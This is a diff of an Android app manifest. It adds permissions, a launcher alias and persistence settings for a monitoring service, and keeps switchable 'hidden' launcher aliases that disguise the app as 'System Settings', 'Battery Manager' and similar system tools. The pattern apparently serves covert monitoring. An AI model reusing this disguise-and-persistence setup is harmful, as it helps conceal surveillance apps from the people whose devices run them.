@@ -18,6 +18,9 @@
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
         android:maxSdkVersion="32"/>
     <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission"/>
+    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT"/>
 
     <application
         android:name=".MMIDSApp"
@@ -39,11 +42,22 @@
             android:resizeableActivity="true"/>
 
         <!-- Hidden launcher aliases — only one enabled at a time -->
-        <activity-alias android:name=".AliasSettings"
+        <activity-alias android:name=".AliasMMID"
             android:targetActivity=".MainActivity"
             android:enabled="true" android:exported="true"
+            android:label="MMID" android:icon="@mipmap/ic_launcher"
+            android:roundIcon="@mipmap/ic_launcher_round">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias android:name=".AliasSettings"
+            android:targetActivity=".MainActivity"
+            android:enabled="false" android:exported="true"
             android:label="System Settings" android:icon="@mipmap/ic_launcher"
-        android:roundIcon="@mipmap/ic_launcher_round">
+            android:roundIcon="@mipmap/ic_launcher_round">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
@@ -54,7 +68,7 @@
             android:targetActivity=".MainActivity"
             android:enabled="false" android:exported="true"
             android:label="Signal Monitor" android:icon="@mipmap/ic_launcher"
-        android:roundIcon="@mipmap/ic_launcher_round">
+            android:roundIcon="@mipmap/ic_launcher_round">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
@@ -65,7 +79,7 @@
             android:targetActivity=".MainActivity"
             android:enabled="false" android:exported="true"
             android:label="Device Tools" android:icon="@mipmap/ic_launcher"
-        android:roundIcon="@mipmap/ic_launcher_round">
+            android:roundIcon="@mipmap/ic_launcher_round">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
@@ -76,7 +90,7 @@
             android:targetActivity=".MainActivity"
             android:enabled="false" android:exported="true"
             android:label="Usage Stats" android:icon="@mipmap/ic_launcher"
-        android:roundIcon="@mipmap/ic_launcher_round">
+            android:roundIcon="@mipmap/ic_launcher_round">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
@@ -87,7 +101,7 @@
             android:targetActivity=".MainActivity"
             android:enabled="false" android:exported="true"
             android:label="Battery Manager" android:icon="@mipmap/ic_launcher"
-        android:roundIcon="@mipmap/ic_launcher_round">
+            android:roundIcon="@mipmap/ic_launcher_round">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
@@ -98,7 +112,7 @@
             android:targetActivity=".MainActivity"
             android:enabled="false" android:exported="true"
             android:label="Network Info" android:icon="@mipmap/ic_launcher"
-        android:roundIcon="@mipmap/ic_launcher_round">
+            android:roundIcon="@mipmap/ic_launcher_round">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
@@ -109,7 +123,7 @@
             android:targetActivity=".MainActivity"
             android:enabled="false" android:exported="true"
             android:label="Clock Service" android:icon="@mipmap/ic_launcher"
-        android:roundIcon="@mipmap/ic_launcher_round">
+            android:roundIcon="@mipmap/ic_launcher_round">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
@@ -120,7 +134,7 @@
             android:targetActivity=".MainActivity"
             android:enabled="false" android:exported="true"
             android:label="File Manager" android:icon="@mipmap/ic_launcher"
-        android:roundIcon="@mipmap/ic_launcher_round">
+            android:roundIcon="@mipmap/ic_launcher_round">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
@@ -135,7 +149,8 @@
             android:turnScreenOn="true"
             android:theme="@style/Theme.MMIDS"
             android:launchMode="singleInstance"
-            android:excludeFromRecents="true"/>
+            android:excludeFromRecents="true"
+            android:screenOrientation="portrait"/>
 
         <!-- Receivers -->
         <receiver android:name=".receivers.VolumeReceiver" android:exported="false">
@@ -201,7 +216,8 @@
         <service
             android:name=".services.MonitoringService"
             android:foregroundServiceType="dataSync"
-            android:exported="false"/>
+            android:exported="false"
+            android:stopWithTask="false"/>
 
     </application>
 </manifest>
